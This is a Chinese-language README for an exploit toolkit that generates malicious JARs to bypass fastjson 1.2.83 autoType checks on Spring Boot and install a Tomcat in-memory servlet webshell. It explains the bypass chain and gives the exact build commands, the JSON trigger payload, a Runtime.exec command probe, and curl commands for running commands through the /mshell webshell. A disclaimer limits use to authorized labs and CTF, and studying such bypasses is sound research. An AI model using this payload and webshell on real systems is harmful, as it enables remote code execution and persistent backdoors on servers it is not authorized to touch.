# GenJar

fastjson 1.2.83 `jar:` 协议 autoType 绕过 —— 恶意类 JAR 生成器 + Tomcat 内存马安装器。

> [!WARNING]
> **免责声明**：本项目仅用于**已授权的靶场、CTF 与安全研究**。请勿用于任何未获授权的真实系统。
> 使用者需自行承担全部责任，作者不对任何滥用行为负责。

---

## 这是什么

`GenJar` 用 ASM 动态生成一个带 `@JSONType` 注解、继承 `ClassLoader` 的类，并打包成 JAR。
这个类的**类名本身就是一段 `jar:file:...!/Exception` 的 URL**，用来在 fastjson 的
`checkAutoType()` 里走通"先探测 `@JSONType`、后校验黑名单"的逻辑分支。

生成的 payload 有两种形态：

| 模式 | 参数 | 行为 |
| --- | --- | --- |
| 命令探针 | `--cmd '<cmd>'` | 构造器里 `Runtime.exec` 执行命令 |
| 内嵌 Installer | `--installer <Installer.class>` | 构造器里 Base64 解码 + `defineClass` + `newInstance` |
| 外部 Base64 | `--installer-b64 <file>` | 同上，直接喂 MemShellParty 的 Base64 输出 |

`Installer.java` 是一个**无第三方依赖**的最简 Tomcat Servlet 内存马：被载体类
`defineClass` + `newInstance()` 之后，构造器自动反射拿到 `StandardContext` 并注册到
`/mshell`，之后 `/mshell?cmd=id` 即可执行命令。

## 原理

fastjson 的 `ParserConfig.checkAutoType()` 在真正校验类名之前，会先做一次 `@JSONType` 注解探测：

```java
String resource = typeName.replace('.', '/') + ".class";
is = defaultClassLoader.getResourceAsStream(resource);
```

当 `@type` 形如 `jar:file:.tmp.uploads.fj31!.Exception` 时，`resource` 就是
`jar:file:/tmp/uploads/fj31!/Exception.class` —— 一个合法的 JAR URL。
在 Spring Boot fat jar（`LaunchedURLClassLoader`）下，`URLClassPath` 会退化成通用 `Loader`，
直接 `new URL(base, name).openStream()`，于是真的去打开上传的文件、按 zip 读出 `Exception.class`。

类上带 `@JSONType` 时 `jsonType=true`，进入信任分支并**直接 return**（在 ClassLoader 黑名单检查之前），
随后 `TypeUtils.loadClass` 用同一个加载器把类 define 出来，fastjson 反射 `newInstance()`，
触发 `<clinit>` / 构造器。

**三处名字必须对齐：**

| 位置 | 值 |
| --- | --- |
| `@type` | `jar:file:.tmp.uploads.fj31!.Exception`（点形态） |
| `resource` | `jar:file:/tmp/uploads/fj31!/Exception.class` |
| `this_class` | `jar:file:/tmp/uploads/fj31!/Exception`（ASM 内部类名） |
| zip entry | `Exception.class`（**不能**带前导 `/`） |

## 目录结构

```
.
├── GenJar.java       # 恶意类生成器（ASM 构建字节码 + 打包 zip）
├── Installer.java    # 最简 Tomcat Servlet 内存马
├── README.md
└── .gitignore
```

> 仓库不包含 `asm-9.6.jar`、`servlet-api.jar` 及 MemShellParty GUI 等第三方二进制，
> 请按下方说明自行获取。

## 依赖

| 依赖 | 用途 | 获取方式 |
| --- | --- | --- |
| JDK 8 | 编译/运行（class 版本默认 52） | 任意 JDK 8 |
| ASM 9.6 | 生成字节码 | `curl -LO https://repo1.maven.org/maven2/org/ow2/asm/asm/9.6/asm-9.6.jar` |
| Servlet API | `Installer.java` 编译期使用 | `curl -LO https://repo1.maven.org/maven2/javax/servlet/javax.servlet-api/4.0.1/javax.servlet-api-4.0.1.jar` |

`Installer.class` 若改用第三方生成器产出，可直接参考 [MemShellParty](https://github.com/JavaSecLab/MemShellParty) 的 Base64 输出。

## 编译

```bash
javac -cp asm-9.6.jar GenJar.java
javac -cp javax.servlet-api-4.0.1.jar Installer.java   # 运行期不依赖该 jar
```

> `Installer` 的编译目标必须是 Java 8，且 Base64 后需小于 65535 字节（常量池 UTF-8 上限）。

## 用法

### 1) 命令探针（验证链路）

```bash
java -cp asm-9.6.jar:. GenJar /tmp/uploads/fj31 --cmd 'id > /tmp/pwned'
```

### 2) 内嵌 Installer 内存马

```bash
java -cp asm-9.6.jar:. GenJar /tmp/uploads/fj31 --installer Installer.class --shell-path /mshell
```

### 2b) 直接使用 Base64 注入器

```bash
# MemShellParty 打包分类选 Base64 / DefaultBase64，保存为 injector.b64
java -cp asm-9.6.jar:. GenJar /tmp/uploads/fj31 --installer-b64 injector.b64
```

### 参数

| 参数 | 说明 |
| --- | --- |
| `--out <file>` | 输出文件名（默认取 targetPath 最后一段，且必须与之一致） |
| `--win` | `cmd.exe /c` 代替 `/bin/sh -c`（仅 `--cmd` 模式） |
| `--version <n>` | class 版本：52（Java 8，默认）/ 51 / 50 |
| `--shell-path <path>` | 内存马路径，默认 `/mshell`（仅 installer 模式） |

生成后，将产物（如 `fj31`，**无扩展名**）上传到目标机的绝对路径
`/tmp/uploads/fj31`，再触发：

```json
{"@type":"jar:file:.tmp.uploads.fj31!.Exception"}
```

内存马模式安装成功后访问：

```bash
curl 'http://target:8080/mshell?cmd=id'
```

## 约束（违反任意一条链路就断）

- `targetPath` 必须是目标上的**绝对路径**，整体**不能含 `.`**（点会被 `replace` 成 `/`），不能含 `!`，不能以 `/` 结尾；
- `@type` 总长度必须 **< 192**（`checkAutoType` 的长度检查）；
- zip 条目名必须是 `Exception.class`，**不能**是 `/Exception.class`；
- 输出文件名不能含 `.`，且必须等于 `targetPath` 的文件名（上传后按文件名落盘）；
- 目标需为 **JDK 8 + Spring Boot fat jar**（`LaunchedURLClassLoader`）；
- `Installer.class` 必须是 Java 8 目标，Base64 后 **< 65535 字节**。

## 验证

```bash
# 目标侧确认文件已落盘
ls -l /tmp/uploads/fj31

# 命令探针模式
cat /tmp/pwned

# 内存马模式
curl 'http://target:8080/mshell?cmd=whoami'
```

## 致谢

- [ASM](https://asm.ow2.io/) —— 字节码生成
- [MemShellParty](https://github.com/JavaSecLab/MemShellParty) —— 内存马生成器（第三方，未随仓库分发）
